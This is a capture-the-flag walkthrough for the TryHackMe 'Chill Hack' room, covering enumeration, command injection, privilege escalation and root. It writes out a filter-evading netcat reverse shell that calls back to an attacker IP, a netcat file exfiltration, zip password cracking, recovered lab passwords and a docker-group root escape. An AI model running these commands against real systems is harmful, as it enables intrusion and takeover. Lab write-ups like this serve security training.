# [Challenge](https://tryhackme.com/room/chillhack)

- # ENUM
	- ### nmap (`nmap -p- -A -T4 chillHack`)
		- 21 -> ftp
		- 22 -> ssh
		- 80 -> http (Apache 2.4.41)
			- Title: Game Info
	- ### gobuster (`gobuster dir -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u 10.10.69.141 -x .html,.php,.txt`)
		- /index.html           (Status: 200) [Size: 35184]
			/images               (Status: 301) [Size: 313] [--> http://10.10.69.141/images/]
			/news.html            (Status: 200) [Size: 19718]
			/about.html           (Status: 200) [Size: 21339]
			/contact.php          (Status: 200) [Size: 0]
			/contact.html         (Status: 200) [Size: 18301]
			/blog.html            (Status: 200) [Size: 30279]
			/css                  (Status: 301) [Size: 310] [--> http://10.10.69.141/css/]
			/team.html            (Status: 200) [Size: 19868]
			/js                   (Status: 301) [Size: 309] [--> http://10.10.69.141/js/]
			/fonts                (Status: 301) [Size: 312] [--> http://10.10.69.141/fonts/]
			/secret               (Status: 301) [Size: 313] [--> http://10.10.69.141/secret/]

- # EXPLOITATION
	- ftp -> `note.txt` -> `Anurodh told me that there is some filtering on strings being put in the command -- Apaar`
	- The `/secret` allows us to execute commands!
		- `echo /home/*` -> `/home/anurodh /home/apaar /home/aurick /home/ubuntu`
		- I got stuck here, then I remembered that the `\` works as an escape character. Let's open a reverse shell:
			- `r\m /tmp/f;mk\fifo /tmp/f;c\at /tmp/f|/bin/sh -i 2>&1|n\c 10.8.13.111 8888 >/tmp/f`
				- `python3 -c "import pty; pty.spawn('/bin/bash')"`

- # PRIVILEGE ESCALATION
	- `sudo -l` -> we can run `home/apaar/.helpline.sh` as the user apaar:
		- `read -p "Hello user! I am $person,  Please enter your message: " msg`
		  `$msg 2>/dev/null`
			- Let's try running the script as apaar and writing `/bin/bash` (`sudo -u apaar ./.helpline.sh`):
				- We're apaar now!
	- There's a sus image in `/var/www/files/hacker-with-laptop_23-2147985341.jpg`: let's download it (`nc 10.8.13.111 6666 < hacker-with-laptop_23-2147985341.jpg` -> `nc -lvnp 6666 > hacker-with-laptop_23-2147985341.jpg`)
		- Let's use `stegsolve` to extract the zip (`backup.zip`)  and `john` `stegseek` to crack the archive's password (`zip2john backup.zip > backup.hash` -> `john backup.hash`)
			- Password: `pass1word`
	- In the archive there's a source code with Anurodh's password in base64.
		- Password: `!d0ntKn0wmYp@ssw0rd`
	- We can see that Anurodh is part of the `docker` group. Let's check on GTFOBins!
		- `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
			- We're ROOT!
